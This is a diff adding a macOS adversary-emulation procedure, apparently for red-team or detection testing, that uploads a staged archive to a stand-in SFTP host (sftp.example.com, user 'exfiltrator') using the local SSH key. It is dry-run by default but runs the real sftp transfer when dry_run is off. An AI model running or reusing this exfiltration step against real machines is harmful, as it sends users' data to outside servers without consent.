@@ -1,0 +1,130 @@
+id: 007-upload-sftp
+name: Upload via SFTP
+description: Exfiltrates data using SFTP protocol for secure file transfer
+api_version: 2.0
+platforms:
+  - os: darwin
+uuid: a7b8c9d0-e1f2-4a3b-5c6d-7e8f90a1b2c3
+requirements:
+  platforms:
+    - os: darwin
+      min_version: 10.12
+args:
+  file_path:
+    description: Local file path for upload
+    type: string
+    default: "/tmp/.staging/data.tar.gz"
+  sftp_host:
+    description: SFTP server hostname
+    type: string
+    default: "sftp.example.com"
+  sftp_user:
+    description: SFTP username
+    type: string
+    default: "exfiltrator"
+  sftp_port:
+    description: SFTP server port
+    type: string
+    default: "22"
+  remote_path:
+    description: Remote directory path
+    type: string
+    default: "/uploads"
+  private_key:
+    description: Private key file path for authentication
+    type: string
+    default: "~/.ssh/id_rsa"
+  dry_run:
+    description: Enable dry-run mode
+    type: string
+    default: "true"
+steps:
+  - name: Verify file exists
+    type: command
+    executor: bash
+    command: test -f '{{ args.file_path }}' || (echo "File not found"; exit 1)
+    cleanup: false
+  
+  - name: Check SSH key exists
+    type: command
+    executor: bash
+    command: |
+      keypath=$(eval echo '{{ args.private_key }}')
+      if [ -f "$keypath" ]; then
+        echo "SSH key found at: $keypath"
+        ls -lh "$keypath"
+      else
+        echo "WARNING: SSH key not found at $keypath"
+      fi
+    cleanup: false
+  
+  - name: Prepare SFTP connection
+    type: command
+    executor: bash
+    command: |
+      keypath=$(eval echo '{{ args.private_key }}')
+      echo "SFTP Configuration:"
+      echo "  Host: {{ args.sftp_host }}"
+      echo "  Port: {{ args.sftp_port }}"
+      echo "  User: {{ args.sftp_user }}"
+      echo "  Remote path: {{ args.remote_path }}"
+      echo "  File: $(basename '{{ args.file_path }}')"
+    cleanup: false
+  
+  - name: Execute SFTP upload
+    type: command
+    executor: bash
+    command: |
+      if [ '{{ args.dry_run }}' = 'true' ]; then
+        keypath=$(eval echo '{{ args.private_key }}')
+        echo "DRY RUN: Would execute SFTP transfer with command:"
+        echo "sftp -P {{ args.sftp_port }} -i $keypath {{ args.sftp_user }}@{{ args.sftp_host }}:{{ args.remote_path }}"
+        echo "  > put '{{ args.file_path }}' '{{ args.remote_path }}/$(basename '{{ args.file_path }}')')"
+      else
+        keypath=$(eval echo '{{ args.private_key }}')
+        sftp -P {{ args.sftp_port }} -i "$keypath" {{ args.sftp_user }}@{{ args.sftp_host }} << SFTP_EOF
+put '{{ args.file_path }}' '{{ args.remote_path }}/$(basename '{{ args.file_path }}')'
+bye
+SFTP_EOF
+      fi
+    cleanup: false
+checks:
+  - name: SFTP server reachable
+    description: Verify SFTP server connection parameters
+    type: command
+    command: |
+      echo "{{ args.sftp_host }}" | grep -qE '^[a-zA-Z0-9.-]+$' && echo "Valid hostname"
+  
+  - name: File readable
+    description: Verify file is accessible
+    type: command
+    command: test -r '{{ args.file_path }}'
+tests:
+  dry_run:
+    - name: Test SFTP upload (dry-run)
+      description: Test SFTP upload preparation
+      type: basic
+      steps:
+        - name: Create test file
+          type: command
+          executor: bash
+          command: echo "Data for SFTP" > /tmp/test_sftp.dat
+        
+        - name: Prepare SFTP command
+          type: command
+          executor: bash
+          command: |
+            echo "SFTP Upload Command (dry-run):"
+            echo "sftp -P 22 -i ~/.ssh/id_rsa user@host:/uploads"
+            echo "  > put /tmp/test_sftp.dat /uploads/test_sftp.dat"
+        
+        - name: Verify file
+          type: command
+          executor: bash
+          command: ls -lh /tmp/test_sftp.dat
+cleanup:
+  - name: Remove test file
+    type: command
+    executor: bash
+    command: rm -f /tmp/test_sftp.dat
+    ignore_errors: true
